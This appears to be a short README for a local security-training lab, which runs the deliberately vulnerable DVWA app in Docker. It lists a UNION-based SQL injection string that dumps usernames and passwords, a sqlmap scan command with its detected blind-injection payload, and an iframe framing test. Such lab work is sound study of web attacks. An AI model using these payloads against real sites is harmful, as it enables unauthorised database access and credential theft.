## Запуск тестового сайта

```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

## Настройка
1. http://localhost/index.php
2. reset/create database
3. admin:password
4. `%' and 1=0 union select null, concat(user,':',password) from users`

## SQL-injection scan example
`sqlmap -r sqlmap.example --dbms=mysql --risk=3 --level=5`<br/>
GET parameter 'id' is **vulnerable**. <br/>
sqlmap identified the following injection point(s) with a total of 502 HTTP(s) requests:
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: id=1' OR NOT 4197=4197-- twle&Submit=Submit
```

## XSS-injection example
open iframe.html in browser you should not see the site<br/>
Refused to display 'https://ya.ru/' in a frame because it set 'X-Frame-Options' to 'deny'.<br/>
But on the vulnerable app like localhost/login.php you will see the form

